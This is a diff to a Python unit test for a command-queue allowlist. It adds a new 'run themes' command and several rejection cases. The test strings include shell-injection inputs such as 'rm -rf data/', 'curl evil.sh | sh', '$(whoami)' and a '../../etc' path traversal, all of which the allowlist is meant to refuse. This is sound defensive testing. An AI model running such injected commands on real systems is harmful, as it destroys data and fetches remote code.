@@ -501,7 +501,7 @@ class TestQueueAllowlist(unittest.TestCase):
         self.allowed, self.why = is_allowed, reject_reason
 
     def test_every_legitimate_command_shape(self):
-        for cmd in ("run radar", "run digest", "run chain SIG-20260829-01",
+        for cmd in ("run radar", "run digest", "run themes", "run chain SIG-20260829-01",
                     "run heat ai-infrastructure", "run scenarios ai-infrastructure",
                     "run screen ai-infrastructure", "run screen ai-infrastructure S2",
                     "run deepdive VRT ai-infrastructure",
@@ -512,6 +512,8 @@ class TestQueueAllowlist(unittest.TestCase):
 
     def test_shell_metacharacters_never_ride_along(self):
         for cmd in ("run radar && echo pwned", "run radar; rm -rf data/",
+                    "run themes && cat data/ledger.md", "run themes; rm -rf data/themes",
+                    "run themes ../../etc", "run themesx", "run theme",
                     "run chain SIG-20260829-01 || curl evil.sh | sh",
                     "run screen ai-infrastructure $(whoami)",
                     "run screen ai-infrastructure `id`",
